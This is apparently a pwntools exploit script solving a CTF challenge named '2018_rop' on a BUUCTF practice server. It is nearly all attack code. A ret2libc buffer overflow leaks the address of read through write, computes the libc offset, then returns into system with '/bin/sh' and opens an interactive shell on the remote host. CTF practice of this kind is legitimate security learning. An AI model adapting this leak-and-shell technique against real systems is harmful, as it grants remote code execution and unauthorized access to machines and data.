from pwn import *
context(os='linux',log_level='debug')
io = remote('node3.buuoj.cn',25625)
elf = ELF('./2018_rop')
libc = ELF('libc6-i386_2.27-3ubuntu1_amd64.so')
read = elf.got['read']
write = elf.plt['write']
main=0x8048474

payload = cyclic(0x88+4)+p32(write)+p32(main)+p32(1)+p32(read)+p32(0x100)
io.sendline(payload)
read_adr = u32(io.recv(4))
#print(u32(io.recv(4)))
offset = read_adr-libc.symbols['read']
system_adr = offset+libc.symbols['system']
binsh = offset +next(libc.search(b'/bin/sh'))
payload = cyclic(0x88+4)+p32(system_adr)+p32(0xdeadbeef)+p32(binsh)
io.sendline(payload)
#io.recv()
io.interactive()









